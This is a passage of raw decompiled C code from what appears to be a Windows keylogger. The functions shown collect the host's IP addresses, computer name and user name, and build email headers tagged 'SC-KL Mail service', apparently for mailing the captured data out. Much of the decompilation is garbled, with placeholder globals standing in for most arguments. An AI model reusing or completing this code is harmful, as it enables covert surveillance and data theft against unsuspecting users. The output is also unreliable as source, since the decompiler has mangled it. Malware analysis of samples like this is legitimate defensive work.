    *(int32_t *)v4 = *(int32_t *)v5;
    *(int16_t *)(v4 + v3) = *(int16_t *)(v5 + v3);
    int32_t len = strlen((char *)&str); // 0x40733d
    int32_t v6; // bp-28, 0x40731f
    int32_t v7 = &v6; // 0x407344
    int32_t * v8; // 0x40731f
    if (len == 0) {
        // 0x40731f
        v8 = (int32_t *)(v7 - 4);
    } else {
        int32_t * v9 = (int32_t *)(v7 - 4);
        int32_t v10 = 0; // 0x40734f
        int32_t v11; // bp-4, 0x40731f
        char * v12 = (char *)((int32_t)&v11 - 16 + v10); // 0x407347
        *v12 = *v12 - 1;
        *v9 = v1;
        v10++;
        int32_t len2 = strlen((char *)&g57); // 0x407350
        v8 = v9;
        while (v10 != len2) {
            // 0x407347
            v12 = (char *)((int32_t)&v11 - 16 + v10);
            *v12 = *v12 - 1;
            *v9 = v1;
            v10++;
            len2 = strlen((char *)&g57);
            v8 = v9;
        }
    }
    // 0x40735a
    *v8 = 0;
    *(char *)result = (char)a2;
    function_4047b7((int32_t)&g57);
    int32_t * v13 = (int32_t *)(v7 - 8); // 0x40736e
    *v13 = v1;
    *v13 = strlen((char *)&g57);
    *(int32_t *)(v7 - 12) = v1;
    function_405027((int32_t)&g57);
    return result;
}

// Address range: 0x407387 - 0x4073bc
int32_t function_407387(void) {
    // 0x407387
    int32_t v1; // 0x407387
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40738c
    int32_t v3 = *v2; // 0x40738c
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x40738f
    int32_t v5 = *v4; // 0x40738f
    int32_t v6 = v5; // 0x407394
    int32_t v7 = v3; // 0x407394
    int32_t v8; // bp-12, 0x407387
    int32_t v9 = &v8; // 0x407394
    if (v5 != v3) {
        v9 -= 4;
        *(int32_t *)v9 = 1;
        function_4047b7((int32_t)&g57);
        v6 += 16;
        while (v6 != v3) {
            // 0x407396
            v9 -= 4;
            *(int32_t *)v9 = 1;
            function_4047b7((int32_t)&g57);
            v6 += 16;
        }
        // 0x407392
        v7 = *v4;
    }
    // 0x4073a4
    *(int32_t *)(v9 - 4) = v7;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v4 = 0;
    *v2 = 0;
    *(int32_t *)(v1 + 12) = 0;
    return 0;
}

// Address range: 0x4073bc - 0x4073dd
int32_t function_4073bc(void) {
    // 0x4073bc
    if ((g53 & 1) == 0) {
        // 0x4073c5
        g53 |= 1;
    }
    // 0x4073d1
    return function_408584(0x4078aa);
}

// Address range: 0x4073dd - 0x40756d
int32_t function_4073dd(void) {
    // 0x4073dd
    function_408520((int32_t)&g57);
    int32_t v1; // 0x4073dd
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x4073ee
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x4073f3
    int32_t * v4 = (int32_t *)(v2 + 4); // 0x4073f6
    int32_t v5; // bp-768, 0x4073dd
    *(int32_t *)(v1 - 16) = (int32_t)&v5;
    int32_t v6; // 0x4073dd
    int32_t v7; // 0x4073dd
    function_4075d4(*v4, *v3, v5, v6, v7);
    if (WSAStartup(514, (struct WSAData *)(v1 - 768)) != 0) {
        // 0x40755e
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return 0;
    }
    char * name = (char *)(v1 - 368); // 0x40742f
    int32_t v8 = v1 - 4; // 0x407430
    *(int32_t *)v8 = 0;
    char * v9; // bp-796, 0x4073dd
    if (gethostname(name, 256) != 0) {
        // 0x40743d
        v9 = (char *)&g13;
        int32_t * v10 = (int32_t *)(v1 - 32); // 0x407446
        *v10 = 0;
        _CxxThrowException(v10, (int32_t *)v9);
        // UNREACHABLE
    }
    // 0x40744e
    v9 = name;
    struct hostent * v11 = gethostbyname(name); // 0x407455
    if (v11 == NULL) {
        int32_t * v12 = (int32_t *)(v1 - 28); // 0x40746a
        *v12 = 0;
        _CxxThrowException(v12, (int32_t *)&g13);
        // UNREACHABLE
    }
    int32_t v13 = (int32_t)v11; // 0x407455
    int16_t * v14 = (int16_t *)(v13 + 10); // 0x407472
    if (*v14 != 4) {
        int32_t * v15 = (int32_t *)(v1 - 24); // 0x407482
        *v15 = 0;
        _CxxThrowException(v15, (int32_t *)&g13);
        // UNREACHABLE
    }
    int32_t v16 = v1 - 112; // 0x407491
    *(char *)v16 = *(char *)&g29;
    int32_t v17 = v1 - 111; // 0x407497
    __asm_rep_stosd_memset((char *)v17, 0, 15);
    bool v18; // 0x4073dd
    int32_t v19 = (v18 ? -60 : 60) + v17; // 0x40749a
    *(int16_t *)v19 = 0;
    *(char *)(v19 + (v18 ? -2 : 2)) = 0;
    int32_t * v20 = (int32_t *)(v13 + 12); // 0x4074a1
    int32_t * v21 = (int32_t *)*v20; // 0x4074a4
    if (*v21 != 0) {
        int32_t v22 = v1 - 20; // 0x4074b8
        int32_t v23 = v1 - 48;
        char * v24 = (char *)v8;
        int32_t v25 = 0; // 0x40752d
        int32_t v26 = (int32_t)&v9;
        int32_t * v27 = (int32_t *)(v26 - 4); // 0x4074b5
        *v27 = (int32_t)*v14;
        int32_t * v28 = (int32_t *)(v26 - 8); // 0x4074b6
        *v28 = *v21;
        int32_t * v29 = (int32_t *)(v26 - 12); // 0x4074bb
        *v29 = v22;
        memcpy(&g57, &g57, (int32_t)&g57);
        *v27 = (int32_t)*(char *)(v1 - 17);
        *v28 = (int32_t)*(char *)(v1 - 18);
        *v29 = (int32_t)*(char *)(v1 - 19);
        int32_t * v30 = (int32_t *)(v26 - 16); // 0x4074d7
        *v30 = (int32_t)*(char *)v22;
        int32_t v31 = v26 - 20; // 0x4074db
        int32_t * v32 = (int32_t *)v31; // 0x4074db
        *v32 = (int32_t)"%d.%d.%d.%d";
        *(int32_t *)(v26 - 24) = v16;
        sprintf((char *)&g57, (char *)&g57);
        *(char *)v23 = *(char *)(v1 + 11);
        *v27 = 0;
        function_4047b7((int32_t)&g57);
        *v28 = v16;
        *v28 = strlen((char *)&g57);
        *v29 = v16;
        function_405027((int32_t)&g57);
        *v30 = v23;
        *v24 = 1;
        function_4075c3((int32_t)&g57);
        *v24 = 0;
        *v32 = 1;
        function_4047b7((int32_t)&g57);
        v25++;
        int32_t * v33 = (int32_t *)(*v20 + 4 * v25); // 0x4074a4
        while (*v33 != 0) {
            // 0x4074b1
            v26 = v31;
            v27 = (int32_t *)(v26 - 4);
            *v27 = (int32_t)*v14;
            v28 = (int32_t *)(v26 - 8);
            *v28 = *v33;
            v29 = (int32_t *)(v26 - 12);
            *v29 = v22;
            memcpy(&g57, &g57, (int32_t)&g57);
            *v27 = (int32_t)*(char *)(v1 - 17);
            *v28 = (int32_t)*(char *)(v1 - 18);
            *v29 = (int32_t)*(char *)(v1 - 19);
            v30 = (int32_t *)(v26 - 16);
            *v30 = (int32_t)*(char *)v22;
            v31 = v26 - 20;
            v32 = (int32_t *)v31;
            *v32 = (int32_t)"%d.%d.%d.%d";
            *(int32_t *)(v26 - 24) = v16;
            sprintf((char *)&g57, (char *)&g57);
            *(char *)v23 = *(char *)(v1 + 11);
            *v27 = 0;
            function_4047b7((int32_t)&g57);
            *v28 = v16;
            *v28 = strlen((char *)&g57);
            *v29 = v16;
            function_405027((int32_t)&g57);
            *v30 = v23;
            *v24 = 1;
            function_4075c3((int32_t)&g57);
            *v24 = 0;
            *v32 = 1;
            function_4047b7((int32_t)&g57);
            v25++;
            v33 = (int32_t *)(*v20 + 4 * v25);
        }
    }
    // 0x40753c
    WSACleanup();
    int32_t v34 = *v4; // 0x407542
    int32_t result = 0; // 0x407547
    if (v34 != 0) {
        // 0x40754d
        result = *v3 - v34 >= 16;
    }
    // 0x40755e
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x40756d - 0x407598
int32_t function_40756d(int32_t a1, int32_t a2) {
    int32_t nSize = a2;
    char * lpBuffer = (char *)a1; // 0x40757d
    bool v1 = GetComputerNameA(lpBuffer, &nSize); // 0x40757d
    int32_t dest_str = v1; // 0x407585
    if (!v1) {
        // 0x407587
        dest_str = (int32_t)strcpy(lpBuffer, g21);
    }
    // 0x407596
    return dest_str;
}

// Address range: 0x407598 - 0x4075c3
int32_t function_407598(int32_t a1, int32_t a2) {
    int32_t pcbBuffer = a2;
    char * lpBuffer = (char *)a1; // 0x4075a8
    bool v1 = GetUserNameA(lpBuffer, &pcbBuffer); // 0x4075a8
    int32_t dest_str = v1; // 0x4075b0
    if (!v1) {
        // 0x4075b2
        dest_str = (int32_t)strcpy(lpBuffer, g21);
    }
    // 0x4075c1
    return dest_str;
}

// Address range: 0x4075c3 - 0x4075d4
int32_t function_4075c3(int32_t a1) {
    // 0x4075c3
    int32_t v1; // 0x4075c3
    return function_407630(*(int32_t *)(v1 + 8), 1, a1);
}

// Address range: 0x4075d4 - 0x407630
int32_t function_4075d4(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4075d4
    int32_t v1; // 0x4075d4
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4075e5
    int32_t v3 = *v2; // 0x4075e5
    int32_t v4 = a2; // 0x4075ea
    int32_t v5 = a2; // 0x4075ea
    int32_t v6 = result; // 0x4075ea
    int32_t v7; // bp-16, 0x4075d4
    int32_t v8 = &v7; // 0x4075ea
    if (v3 != a2) {
        *(int32_t *)(v8 - 4) = -1;
        *(int32_t *)(v8 - 8) = 0;
        v8 -= 12;
        *(int32_t *)v8 = v4;
        function_404f59(v4, (int32_t)&g57, (int32_t)&g57);
        v4 += 16;
        v6 += 16;
        while (v4 != v3) {
            // 0x4075ec
            *(int32_t *)(v8 - 4) = -1;
            *(int32_t *)(v8 - 8) = 0;
            v8 -= 12;
            *(int32_t *)v8 = v4;
            function_404f59(v4, (int32_t)&g57, (int32_t)&g57);
            v4 += 16;
            v6 += 16;
        }
        // 0x407606
        v5 = *v2;
    }
    int32_t v9 = v6; // 0x40760e
    int32_t v10 = v8; // 0x40760e
    if (v6 == v5) {
        // 0x407623
        *v2 = v6;
        return result;
    }
    v10 -= 4;
    *(int32_t *)v10 = 1;
    function_4047b7(v9);
    v9 += 16;
    while (v9 != v5) {
        // 0x407610
        v10 -= 4;
        *(int32_t *)v10 = 1;
        function_4047b7(v9);
        v9 += 16;
    }
    // 0x407623
    *v2 = v6;
    return result;
}

// Address range: 0x407630 - 0x407861
int32_t function_407630(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x407630
    int32_t v1; // bp-28, 0x407630
    int32_t v2 = &v1; // 0x40763a
    int32_t v3; // 0x407630
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x40763e
    int32_t v5 = *v4; // 0x40763e
    int32_t * v6 = (int32_t *)(v3 + 12); // 0x407641
    if ((*v6 - v5) / 16 < a2) {
        int32_t * v7 = (int32_t *)(v3 + 4); // 0x407651
        int32_t v8 = *v7; // 0x407651
        int32_t v9 = (v5 - v8) / 16;
        int32_t v10 = (v9 > a2 == (v8 != 0) ? v9 : a2) + (v8 != 0 ? v9 : 0); // 0x407672
        int32_t v11 = 16 * v10;
        int32_t v12 = _3f__3f_2_40_YAPAXI_40_Z(v10 >= 0 ? v11 : 0); // 0x407681
        int32_t v13 = *v7; // 0x407686
        int32_t v14 = v12; // 0x407693
        if (v13 != a1) {
            int32_t v15 = v13; // 0x4076a4
            int32_t v16 = v12; // 0x40769e
            *(int32_t *)(v2 - 4) = v15;
            *(int32_t *)(v2 - 8) = v16;
            function_407861();
            v16 += 16;
            v15 += 16;
            v14 = v16;
            while (v15 != a1) {
                // 0x407695
                *(int32_t *)(v2 - 4) = v15;
                *(int32_t *)(v2 - 8) = v16;
                function_407861();
                v16 += 16;
                v15 += 16;
                v14 = v16;
            }
        }
        // 0x4076a9
        if (a2 != 0) {
            int32_t v17 = a2; // 0x4076c0
            int32_t v18 = v14; // 0x407630
            *(int32_t *)(v2 - 4) = a3;
            *(int32_t *)(v2 - 8) = v18;
            function_407861();
            v17--;
            v18 += 16;
            while (v17 != 0) {
                // 0x4076b3
                *(int32_t *)(v2 - 4) = a3;
                *(int32_t *)(v2 - 8) = v18;
                function_407861();
                v17--;
                v18 += 16;
            }
        }
        int32_t v19 = *v4; // 0x4076c9
        int32_t v20 = a1; // 0x4076db
        if (v19 != a1) {
            int32_t v21 = a1; // 0x4076dd
            int32_t v22 = v14 + 16 * a2; // 0x4076dd
            *(int32_t *)(v2 - 4) = v21;
            *(int32_t *)(v2 - 8) = v22;
            function_407861();
            v21 += 16;
            v22 += 16;
            while (v21 != v19) {
                // 0x4076e0
                *(int32_t *)(v2 - 4) = v21;
                *(int32_t *)(v2 - 8) = v22;
                function_407861();
                v21 += 16;
                v22 += 16;
            }
            // 0x4076fa
            v20 = *v4;
        }
        int32_t v23 = *v7; // 0x4076fd
        int32_t v24 = v20; // 0x407705
        int32_t v25 = v2; // 0x407705
        if (v23 != v20) {
            int32_t v26 = v2 - 4; // 0x407707
            *(int32_t *)v26 = 1;
            function_4047b7((int32_t)&g57);
            int32_t v27 = v23 + 16; // 0x407710
            int32_t v28 = v27; // 0x407716
            int32_t v29 = v26; // 0x407716
            while (v27 != v20) {
                // 0x407707
                v26 = v29 - 4;
                *(int32_t *)v26 = 1;
                function_4047b7((int32_t)&g57);
                v27 = v28 + 16;
                v28 = v27;
                v29 = v26;
            }
            // 0x407718
            v24 = *v7;
            v25 = v26;
        }
        // 0x407718
        *(int32_t *)(v25 - 4) = v24;
        _3f__3f_3_40_YAXPAX_40_Z(&g57);
        int32_t v30 = *v7; // 0x407727
        *v6 = v11 + v12;
        int32_t v31 = 0; // 0x407734
        if (v30 != 0) {
            // 0x40773a
            v31 = (*v4 - v30) / 16;
        }
        // 0x407742
        *v7 = v12;
        int32_t result = 16 * (v31 + a2) + v12; // 0x40774a
        *v4 = result;
        // 0x40785a
        return result;
    }
    int32_t result2 = (v5 - a1) / 16; // 0x40775b
    int32_t result3; // 0x407630
    if (result2 >= a2) {
        // 0x4077de
        if (a2 == 0) {
            // 0x40785a
            return result2;
        }
        int32_t v32 = 16 * a2; // 0x4077e2
        int32_t v33 = v5; // 0x4077f2
        if (v32 != 0) {
            int32_t v34 = v5; // 0x407630
            int32_t v35 = v5 - v32; // 0x407801
            *(int32_t *)(v2 - 4) = v35;
            *(int32_t *)(v2 - 8) = v34;
            function_407861();
            v35 += 16;
            v34 += 16;
            while (v35 != v5) {
                // 0x4077f4
                *(int32_t *)(v2 - 4) = v35;
                *(int32_t *)(v2 - 8) = v34;
                function_407861();
                v35 += 16;
                v34 += 16;
            }
            // 0x40780d
            v33 = *v4;
        }
        int32_t v36 = v33 - v32; // 0x407812
        int32_t v37 = v2; // 0x407817
        if (v36 != a1) {
            int32_t v38 = v36 - 16; // 0x407819
            *(int32_t *)(v2 - 4) = -1;
            *(int32_t *)(v2 - 8) = 0;
            int32_t v39 = v2 - 12; // 0x407823
            *(int32_t *)v39 = v38;
            function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
            int32_t v40 = v39; // 0x40782e
            int32_t v41 = v38; // 0x40782e
            v37 = v39;
            while (v38 != a1) {
                // 0x407819
                v38 = v41 - 16;
                *(int32_t *)(v40 - 4) = -1;
                *(int32_t *)(v40 - 8) = 0;
                v39 = v40 - 12;
                *(int32_t *)v39 = v38;
                function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                v40 = v39;
                v41 = v38;
                v37 = v39;
            }
        }
        // 0x407833
        result3 = 0;
        if (v32 != 0) {
            *(int32_t *)(v37 - 4) = -1;
            *(int32_t *)(v37 - 8) = 0;
            int32_t v42 = v37 - 12; // 0x407843
            *(int32_t *)v42 = a3;
            function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
            int32_t v43 = a1 + 16; // 0x40784d
            int32_t v44 = v42; // 0x407852
            int32_t v45 = v43; // 0x407852
            result3 = v32;
            while (v43 != v32 + a1) {
                // 0x40783f
                *(int32_t *)(v44 - 4) = -1;
                *(int32_t *)(v44 - 8) = 0;
                v42 = v44 - 12;
                *(int32_t *)v42 = a3;
                function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                v43 = v45 + 16;
                v44 = v42;
                v45 = v43;
                result3 = v32;
            }
        }
    } else {
        int32_t v46 = 16 * a2; // 0x407767
        int32_t v47 = a1; // 0x407772
        if (v5 != a1) {
            int32_t v48 = a1; // 0x407774
            int32_t v49 = v46 + a1; // 0x407774
            *(int32_t *)(v2 - 4) = v48;
            *(int32_t *)(v2 - 8) = v49;
            function_407861();
            v48 += 16;
            v49 += 16;
            while (v48 != v5) {
                // 0x407777
                *(int32_t *)(v2 - 4) = v48;
                *(int32_t *)(v2 - 8) = v49;
                function_407861();
                v48 += 16;
                v49 += 16;
            }
            // 0x407794
            v47 = *v4;
        }
        int32_t v50 = a2 - (v47 - a1) / 16; // 0x4077a1
        int32_t v51 = v47; // 0x4077a3
        if (v50 != 0) {
            int32_t v52 = v47; // 0x407630
            int32_t v53 = v50; // 0x4077b2
            *(int32_t *)(v2 - 4) = a3;
            *(int32_t *)(v2 - 8) = v52;
            function_407861();
            v53--;
            v52 += 16;
            while (v53 != 0) {
                // 0x4077a5
                *(int32_t *)(v2 - 4) = a3;
                *(int32_t *)(v2 - 8) = v52;
                function_407861();
                v53--;
                v52 += 16;
            }
            // 0x4077b9
            v51 = *v4;
        }
        // 0x4077b9
        result3 = v46;
        if (v51 != a1) {
            *(int32_t *)(v2 - 4) = -1;
            *(int32_t *)(v2 - 8) = 0;
            int32_t v54 = v2 - 12; // 0x4077cb
            *(int32_t *)v54 = a3;
            function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
            int32_t v55 = a1 + 16; // 0x4077d5
            int32_t v56 = v54; // 0x4077da
            int32_t v57 = v55; // 0x4077da
            result3 = v46;
            while (v55 != v51) {
                // 0x4077c7
                *(int32_t *)(v56 - 4) = -1;
                *(int32_t *)(v56 - 8) = 0;
                v54 = v56 - 12;
                *(int32_t *)v54 = a3;
                function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                v55 = v57 + 16;
                v56 = v54;
                v57 = v55;
                result3 = v46;
            }
        }
    }
    // 0x407857
    *v4 = *v4 + result3;
    // 0x40785a
    return result3;
}

// Address range: 0x407861 - 0x4078aa
int32_t function_407861(void) {
    int32_t v1 = function_408520((int32_t)&g57); // 0x407866
    int32_t v2; // 0x407861
    int32_t v3 = *(int32_t *)(v2 + 8); // 0x40786d
    *(int32_t *)(v2 - 16) = v3;
    *(int32_t *)(v2 - 4) = 0;
    int32_t result = v1; // 0x407879
    if (v3 != 0) {
        int32_t v4 = *(int32_t *)(v2 + 12); // 0x40787c
        *(char *)v3 = *(char *)v4;
        function_4047b7(0);
        result = function_404f59(v4, 0, -1);
    }
    // 0x40789d
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x4078aa - 0x4078ab
int32_t function_4078aa(int32_t a1, int32_t a2) {
    // 0x4078aa
    int32_t result; // 0x4078aa
    return result;
}

// Address range: 0x4078ab - 0x4078cc
int32_t function_4078ab(void) {
    // 0x4078ab
    if ((g53 & 1) == 0) {
        // 0x4078b4
        g53 |= 1;
    }
    // 0x4078c0
    return function_408584(0x4078aa);
}

// Address range: 0x4078cc - 0x4078e9
int32_t function_4078cc(void) {
    // 0x4078cc
    int32_t result; // 0x4078cc
    *(int32_t *)result = (int32_t)&g8;
    int32_t v1 = 36; // 0x4078d7
    int32_t v2 = result + 144; // 0x4078d7
    *(int32_t *)v2 = 0;
    v1--;
    v2 -= 4;
    while (v1 != 0) {
        // 0x4078dd
        *(int32_t *)v2 = 0;
        v1--;
        v2 -= 4;
    }
    // 0x4078e8
    return result;
}

// Address range: 0x407905 - 0x407910
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ6(void) {
    // 0x407905
    int32_t v1; // 0x407905
    *(int32_t *)v1 = (int32_t)&g8;
    return function_407a83();
}

// Address range: 0x407910 - 0x4079c6
int32_t function_407910(int32_t a1) {
    int32_t v1 = a1; // bp-52, 0x40791b
    int32_t v2; // 0x407910
    int32_t v3; // 0x407910
    int32_t v4; // 0x407910
    if (function_407af5(a1, v2, v3, v4) == 0) {
        // 0x4079bf
        return 13;
    }
    // 0x40792e
    int32_t v5; // 0x407910
    int32_t v6 = v5 + 52; // 0x40792e
    int32_t v7 = &v1; // 0x407937
    int32_t v8 = 12; // 0x407938
    int32_t v9 = 12; // 0x407938
    int32_t v10 = v7; // 0x407938
    if (*(int32_t *)v6 != 0) {
        int32_t v11 = v6;
        int32_t v12 = v7;
        int32_t v13 = v12 - 4; // 0x40793c
        *(int32_t *)v13 = v8;
        if (function_407ad4((int32_t)&g57) != 0) {
            // 0x407948
            *(int32_t *)(v12 - 8) = a1;
            *(int32_t *)(v12 - 12) = *(int32_t *)v11;
            if (_mbscmp((char *)&g57, (char *)&g57) == 0) {
                // 0x4079bf
                return 0;
            }
        }
        while (v8 <= 34) {
            // 0x407962
            v8++;
            int32_t v14 = v11 + 4; // 0x40795a
            v9 = v8;
            v10 = v13;
            if (*(int32_t *)v14 == 0) {
                goto lab_0x407967;
            }
            v11 = v14;
            v12 = v13;
            v13 = v12 - 4;
            *(int32_t *)v13 = v8;
            if (function_407ad4((int32_t)&g57) != 0) {
                // 0x407948
                *(int32_t *)(v12 - 8) = a1;
                *(int32_t *)(v12 - 12) = *(int32_t *)v11;
                if (_mbscmp((char *)&g57, (char *)&g57) == 0) {
                    // 0x4079bf
                    return 0;
                }
            }
        }
        // 0x4079bc
        *(int32_t *)(v12 - 8) = 14;
        // 0x4079bf
        return 14;
    }
  lab_0x407967:;
    int32_t * v15 = (int32_t *)(v10 - 4);
    *v15 = a1;
    int32_t v16 = v5 + 4 + 4 * v9; // 0x40796a
    int32_t len = strlen((char *)&g57); // 0x40796e
    int32_t * v17 = (int32_t *)(v10 - 8); // 0x407973
    *v17 = len;
    int32_t * v18 = (int32_t *)(v10 - 12); // 0x407974
    *v18 = v16;
    if (function_40450f((int32_t)&g57, (int32_t)&g57) == 0) {
        // 0x4079bc
        *v15 = 14;
        // 0x4079bf
        return 14;
    }
    // 0x407981
    *v15 = a1;
    *v17 = *(int32_t *)v16;
    strcpy((char *)&g57, (char *)&g57);
    *v18 = 10;
    int32_t v19; // bp-36, 0x407910
    int32_t v20 = &v19; // 0x407993
    *(int32_t *)(v10 - 16) = v20;
    *(int32_t *)(v10 - 20) = v9 - 11;
    int32_t v21 = v5 + 32; // 0x407995
    char * v22 = _itoa((int32_t)&g57, (char *)&g57, (int32_t)&g57); // 0x407998
    *(int32_t *)(v10 - 24) = (int32_t)v22;
    *(int32_t *)(v10 - 28) = strlen((char *)&g57);
    *(int32_t *)(v10 - 32) = v21;
    function_40450f((int32_t)&g57, (int32_t)&g57);
    *(int32_t *)(v10 - 36) = v20;
    *(int32_t *)(v10 - 40) = *(int32_t *)v21;
    strcpy((char *)&g57, (char *)&g57);
    // 0x4079bf
    return 0;
}

// Address range: 0x4079c6 - 0x407a25
int32_t function_4079c6(int32_t a1, int32_t a2) {
    // 0x4079c6
    int32_t v1; // bp-12, 0x4079c6
    int32_t * v2 = &v1; // 0x4079d6
    if (a1 == 2) {
        int32_t v3 = a2; // bp-16, 0x4079d8
        int32_t v4; // 0x4079c6
        int32_t v5; // 0x4079c6
        int32_t v6; // 0x4079c6
        int32_t v7 = function_407af5(a2, v4, v5, v6); // 0x4079d9
        v2 = &v3;
        if (v7 == 0) {
            // 0x407a1f
            return 13;
        }
    }
    int32_t v8 = (int32_t)v2;
    int32_t v9; // 0x4079c6
    if (a2 == 0) {
        // 0x4079ea
        *(int32_t *)(v8 - 4) = v9 + 4 + 4 * a1;
        function_40454b((int32_t)&g57);
        // 0x407a1f
        return 0;
    }
    int32_t * v10 = (int32_t *)(v8 - 4); // 0x4079f6
    *v10 = a2;
    int32_t v11 = v9 + 4 + 4 * a1; // 0x4079f7
    int32_t len = strlen((char *)&g57); // 0x4079fb
    int32_t * v12 = (int32_t *)(v8 - 8); // 0x407a00
    *v12 = len;
    *(int32_t *)(v8 - 12) = v11;
    int32_t result; // 0x4079c6
    if (function_40450f((int32_t)&g57, (int32_t)&g57) == 0) {
        // 0x407a1c
        *v10 = 14;
        result = 14;
    } else {
        // 0x407a0e
        *v10 = a2;
        *v12 = *(int32_t *)v11;
        strcpy((char *)&g57, (char *)&g57);
        result = 0;
    }
    // 0x407a1f
    return result;
}

// Address range: 0x407a25 - 0x407a61
int32_t function_407a25(int32_t a1, int32_t a2) {
    // 0x407a25
    int32_t v1; // bp-12, 0x407a25
    int32_t * v2 = &v1; // 0x407a35
    if (a1 == 2) {
        int32_t v3 = *(int32_t *)a2; // 0x407a37
        int32_t v4 = v3; // bp-16, 0x407a37
        int32_t v5; // 0x407a25
        int32_t v6; // 0x407a25
        int32_t v7; // 0x407a25
        int32_t v8 = function_407af5(v3, v5, v6, v7); // 0x407a39
        v2 = &v4;
        if (v8 == 0) {
            // 0x407a5b
            return 0;
        }
    }
    // 0x407a42
    int32_t v9; // 0x407a25
    int32_t v10 = 4 * a1 + 4 + v9; // 0x407a42
    int32_t * v11 = (int32_t *)v10; // 0x407a42
    if (*v11 != 0) {
        // 0x407a4d
        *(int32_t *)((int32_t)v2 - 4) = v10;
        function_40454b((int32_t)&g57);
        *v11 = 0;
    }
    int32_t result = *(int32_t *)a2; // 0x407a57
    *v11 = result;
    // 0x407a5b
    return result;
}

// Address range: 0x407a61 - 0x407a83
int32_t function_407a61(int32_t a1) {
    int32_t v1 = function_407ad4(a1); // 0x407a6a
    int32_t result = (int32_t)&g29; // 0x407a71
    if (v1 != 0) {
        // 0x407a73
        int32_t v2; // 0x407a61
        result = *(int32_t *)(4 * a1 + 4 + v2);
    }
    // 0x407a7e
    return result;
}

// Address range: 0x407a83 - 0x407aa0
int32_t function_407a83(void) {
    // 0x407a83
    int32_t v1; // 0x407a83
    int32_t v2 = v1 + 144; // 0x407a8d
    int32_t v3 = 36; // 0x407a8d
    int32_t v4; // bp-8, 0x407a83
    *(int32_t *)((int32_t)&v4 - 4) = v2;
    int32_t result = function_40454b((int32_t)&g57); // 0x407a8f
    v3--;
    v2 -= 4;
    while (v3 != 0) {
        // 0x407a8e
        *(int32_t *)((int32_t)&v4 - 4) = v2;
        result = function_40454b((int32_t)&g57);
        v3--;
        v2 -= 4;
    }
    // 0x407a9d
    return result;
}

// Address range: 0x407aa0 - 0x407ad4
int32_t function_407aa0(void) {
    int32_t v1 = 0; // 0x407aa4
    int32_t v2; // bp-8, 0x407aa0
    int32_t v3 = &v2;
    int32_t v4 = v3 - 4; // 0x407aa6
    *(int32_t *)v4 = v1;
    int32_t v5 = function_407ad4((int32_t)&g57); // 0x407aa9
    int32_t result = v1; // 0x407ab0
    while ((v1 & -4) == 8 || v5 != 0) {
        int32_t v6 = v1 + 1; // 0x407ac0
        if (v1 == 2) {
            // 0x407ac2
            *(int32_t *)(v3 - 8) = 7;
            v6 = 7;
        }
        // 0x407ac5
        v1 = v6;
        result = -1;
        if (v1 >= 13) {
            // break -> 0x407acd
            break;
        }
        v3 = v4;
        v4 = v3 - 4;
        *(int32_t *)v4 = v1;
        v5 = function_407ad4((int32_t)&g57);
        result = v1;
    }
    // 0x407acd
    return result;
}

// Address range: 0x407ad4 - 0x407af5
int32_t function_407ad4(int32_t a1) {
    // 0x407ad4
    int32_t v1; // 0x407ad4
    int32_t str = *(int32_t *)(4 * a1 + 4 + v1); // 0x407ad8
    if (str != 0) {
        // 0x407ae0
        if (strlen((char *)str) != 0) {
            // 0x407af2
            return 1;
        }
    }
    // 0x407af2
    return 0;
}

// Address range: 0x407af5 - 0x407b1f
int32_t function_407af5(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    char * str = _mbsstr((char *)a1, g22); // 0x407afe
    if (str != NULL) {
        // 0x407b09
        if (strlen(str) >= 2) {
            // 0x407b1c
            return 1;
        }
    }
    // 0x407b1c
    return 0;
}

// Address range: 0x407b1f - 0x407c18
int32_t function_407b1f(int32_t a1) {
    // 0x407b1f
    function_407a61(4);
    int32_t v1; // 0x407b1f
    int32_t v2 = *(int32_t *)(v1 + 12); // bp-292, 0x407b37
    function_407a61(3);
    char * str = (char *)a1; // 0x407b5b
    sprintf(str, "From: %s <%s>\r\nTo: %s\r\nReply-To: %s <%s>\r\nSubject: %s\r\nX-Mailer: SC-KL Mail service\r\nMIME-Version: 1.0\r\n", (char *)function_407a61(3));
    int32_t str_as_i = atoi((char *)*(int32_t *)(v1 + 32)); // 0x407b63
    int32_t v3 = &v2; // 0x407b6a
    int32_t * v4; // 0x407b1f
    int32_t * v5; // 0x407b1f
    int32_t * v6; // 0x407b1f
    int32_t * v7; // 0x407b1f
    if (str_as_i < 2) {
        // 0x407b1f
        v6 = (int32_t *)(v3 - 16);
        v5 = (int32_t *)(v3 - 12);
        v4 = (int32_t *)(v3 - 8);
        v7 = (int32_t *)(v3 - 4);
    } else {
        // 0x407b72
        strcat(str, "CC: ");
        int32_t * v8 = (int32_t *)(v3 - 4);
        int32_t * v9 = (int32_t *)(v3 - 8);
        int32_t * v10 = (int32_t *)(v3 - 12);
        int32_t * v11 = (int32_t *)(v3 - 16);
        int32_t v12 = v1 + 56; // 0x407b87
        int32_t v13 = str_as_i - 1; // 0x407b87
        *v8 = *(int32_t *)v12;
        *v9 = a1;
        strcat((char *)&g57, (char *)&g57);
        *v10 = (int32_t)&g23;
        *v11 = a1;
        strcat((char *)&g57, (char *)&g57);
        v13--;
        v12 += 4;
        while (v13 != 0) {
            // 0x407b88
            *v8 = *(int32_t *)v12;
            *v9 = a1;
            strcat((char *)&g57, (char *)&g57);
            *v10 = (int32_t)&g23;
